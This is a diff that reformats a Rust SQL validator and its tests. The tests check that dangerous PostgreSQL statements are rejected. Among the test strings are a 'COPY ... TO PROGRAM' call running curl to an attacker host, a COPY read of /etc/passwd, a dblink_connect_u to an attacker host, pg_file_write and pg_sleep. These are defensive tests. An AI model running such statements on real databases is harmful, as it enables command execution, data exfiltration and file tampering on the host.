@@ -549,10 +549,7 @@ fn check_disallowed_functions(stmt: &Statement) -> Result<(), SqlValidationError
         /// has defined a TABLE called `dblink` — that's already a
         /// footgun on its own and the role-wrap (M-2) bounds the
         /// blast radius.
-        fn pre_visit_table_factor(
-            &mut self,
-            tf: &ast::TableFactor,
-        ) -> ControlFlow<Self::Break> {
+        fn pre_visit_table_factor(&mut self, tf: &ast::TableFactor) -> ControlFlow<Self::Break> {
             match tf {
                 ast::TableFactor::Table {
                     name,
@@ -1077,7 +1074,11 @@ mod tests {
     #[test]
     fn returns_rows_select() {
         assert!(validate_sql("SELECT 1", &[]).unwrap().returns_rows);
-        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).unwrap().returns_rows);
+        assert!(
+            validate_sql("SELECT * FROM users WHERE id = $1", &[])
+                .unwrap()
+                .returns_rows
+        );
     }
 
     #[test]
@@ -1090,7 +1091,10 @@ mod tests {
     #[test]
     fn returns_rows_insert_without_returning_is_false() {
         let v = validate_sql("INSERT INTO t (a) VALUES ($1)", &["INSERT".to_string()]).unwrap();
-        assert!(!v.returns_rows, "INSERT without RETURNING should not return rows");
+        assert!(
+            !v.returns_rows,
+            "INSERT without RETURNING should not return rows"
+        );
     }
 
     #[test]
@@ -1172,9 +1176,8 @@ mod tests {
         // command on the database host (well-known RCE vector). Must
         // be rejected regardless of allowlist content.
         for ops in [vec![], vec!["SELECT".to_string(), "INSERT".to_string()]] {
-            let err =
-                validate_sql("COPY secrets TO PROGRAM 'curl https://attacker.com/'", &ops)
-                    .unwrap_err();
+            let err = validate_sql("COPY secrets TO PROGRAM 'curl https://attacker.com/'", &ops)
+                .unwrap_err();
             match err {
                 SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "COPY"),
                 other => panic!("expected AlwaysBlocked(COPY), got {:?}", other),
@@ -1186,8 +1189,7 @@ mod tests {
     fn copy_from_file_is_unconditionally_blocked() {
         // `COPY ... FROM '/etc/passwd'` = arbitrary file read on the
         // database host. Same blanket block.
-        let err =
-            validate_sql("COPY secrets FROM '/etc/passwd'", &[]).unwrap_err();
+        let err = validate_sql("COPY secrets FROM '/etc/passwd'", &[]).unwrap_err();
         assert!(matches!(err, SqlValidationError::AlwaysBlocked(_)));
     }
 
@@ -1282,7 +1284,11 @@ mod tests {
         // INSERT / UPDATE / DELETE under their normal allowlist
         // semantics.
         assert!(validate_sql("SELECT 1", &[]).is_ok());
-        let ops = vec!["INSERT".to_string(), "UPDATE".to_string(), "DELETE".to_string()];
+        let ops = vec![
+            "INSERT".to_string(),
+            "UPDATE".to_string(),
+            "DELETE".to_string(),
+        ];
         assert!(validate_sql("INSERT INTO t (a) VALUES (1)", &ops).is_ok());
         assert!(validate_sql("UPDATE t SET a = 1 WHERE id = 1", &ops).is_ok());
         assert!(validate_sql("DELETE FROM t WHERE id = 1", &ops).is_ok());
@@ -1454,7 +1460,8 @@ mod tests {
     #[test]
     fn nested_cte_insert_inside_subquery_is_blocked() {
         let ops = vec!["SELECT".to_string()];
-        let sql = "SELECT * FROM (WITH b AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM b) sub";
+        let sql =
+            "SELECT * FROM (WITH b AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM b) sub";
         let result = validate_sql(sql, &ops);
         assert!(
             result.is_err(),
@@ -1546,8 +1553,11 @@ mod tests {
         // The UNRESTRICTED dblink connect — lets a non-superuser use any
         // libpq auth method. Denying `dblink_connect` but not `_u` left the
         // explicit bypass open (2026-05-31 deny-list completion).
-        let err =
-            validate_sql("SELECT dblink_connect_u('myconn', 'host=attacker.com')", &[]).unwrap_err();
+        let err = validate_sql(
+            "SELECT dblink_connect_u('myconn', 'host=attacker.com')",
+            &[],
+        )
+        .unwrap_err();
         assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
     }
 
@@ -1556,8 +1566,7 @@ mod tests {
         // adminpack filesystem WRITE — the mutation counterpart to the
         // already-blocked pg_read_file. Writing/deleting host files is
         // strictly worse than reading them.
-        let err =
-            validate_sql("SELECT pg_file_write('/tmp/x', 'data', false)", &[]).unwrap_err();
+        let err = validate_sql("SELECT pg_file_write('/tmp/x', 'data', false)", &[]).unwrap_err();
         assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
     }
 
@@ -1644,11 +1653,8 @@ mod tests {
     #[test]
     fn function_deny_list_walks_into_join_predicates() {
         // Join ON / WHERE / HAVING all reach via the visitor.
-        let err = validate_sql(
-            "SELECT * FROM t1 JOIN t2 ON pg_sleep(60) IS NULL",
-            &[],
-        )
-        .unwrap_err();
+        let err =
+            validate_sql("SELECT * FROM t1 JOIN t2 ON pg_sleep(60) IS NULL", &[]).unwrap_err();
         assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
     }
 
@@ -1705,11 +1711,7 @@ mod tests {
         // We can't directly observe the short-circuit from the public
         // API, but we can pin that a violation deep in the AST still
         // produces a stable error (no panic on traversal continuation).
-        let err = validate_sql(
-            "SELECT (SELECT (SELECT (SELECT pg_sleep(60))))",
-            &[],
-        )
-        .unwrap_err();
+        let err = validate_sql("SELECT (SELECT (SELECT (SELECT pg_sleep(60))))", &[]).unwrap_err();
         assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
     }
 
@@ -1720,7 +1722,11 @@ mod tests {
         // `DisallowedFunction`, NOT `DisallowedOperation`. This means
         // a SELECT-only module is also protected from the function
         // vector.
-        let ops = vec!["SELECT".to_string(), "INSERT".to_string(), "UPDATE".to_string()];
+        let ops = vec![
+            "SELECT".to_string(),
+            "INSERT".to_string(),
+            "UPDATE".to_string(),
+        ];
         let err = validate_sql("SELECT pg_sleep(60)", &ops).unwrap_err();
         assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
     }
@@ -1736,7 +1742,10 @@ mod tests {
             "error string must include function name, got `{msg}`"
         );
         assert!(
-            msg.contains("deny-list") || msg.contains("denied") || msg.contains("rejected") || msg.contains("unconditional"),
+            msg.contains("deny-list")
+                || msg.contains("denied")
+                || msg.contains("rejected")
+                || msg.contains("unconditional"),
             "error string must signal the denied status, got `{msg}`"
         );
     }
